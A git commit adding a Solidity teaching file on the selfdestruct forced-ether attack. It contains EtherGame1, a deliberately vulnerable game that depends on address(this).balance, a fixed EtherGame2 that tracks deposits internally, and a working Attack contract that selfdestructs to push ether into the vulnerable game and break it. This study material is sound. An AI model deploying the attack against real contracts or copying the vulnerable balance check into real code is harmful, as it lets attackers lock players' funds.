8f67a2f79e96a9c3d17e911ea87fbfaea1e67dc7
= <=>
2022-02-09 14:53:25 +0700

    add selfdestruct.sol

---
+++ Tuan1/Selfdestruct.sol
@@ -0,0 +1,69 @@
+// SPDX-License-Identifier: GPL-3.0
+
+pragma solidity >=0.7.0 <0.9.0;
+
+contract EtherGame1 {
+    uint public targetAmount = 7 ether;
+    address public winner;
+    
+
+    function deposit() public payable {
+        require(msg.value == 1 ether, "You can only send 1 Ether");
+
+        uint balance = address(this).balance;
+        require(balance <= targetAmount, "Game is over");
+
+        if (balance == targetAmount) {
+            winner = msg.sender;
+        }
+    }
+
+    function claimReward() public {
+        require(msg.sender == winner, "Not winner");
+
+        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
+        require(sent, "Failed to send Ether");
+    }
+    
+}
+contract EtherGame2 {
+    uint public targetAmount = 7 ether;
+    address public winner;
+    uint public balance;
+    
+
+    function deposit() public payable {
+        require(msg.value == 1 ether, "You can only send 1 Ether");
+
+        balance += msg.value;
+        require(balance <= targetAmount, "Game is over");
+
+        if (balance == targetAmount) {
+            winner = msg.sender;
+        }
+    }
+
+    function claimReward() public {
+        require(msg.sender == winner, "Not winner");
+
+        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
+        require(sent, "Failed to send Ether");
+    }
+    
+}
+contract Attack {
+    EtherGame1 etherGame;
+
+    constructor(EtherGame1 _etherGame) {
+        etherGame = EtherGame1(_etherGame);
+    }
+
+    function attack() public payable {
+        // You can simply break the game by sending ether so that
+        // the game balance >= 7 ether
+
+        // cast address to payable
+        address payable addr = payable(address(etherGame));
+        selfdestruct(addr);
+    }
+}
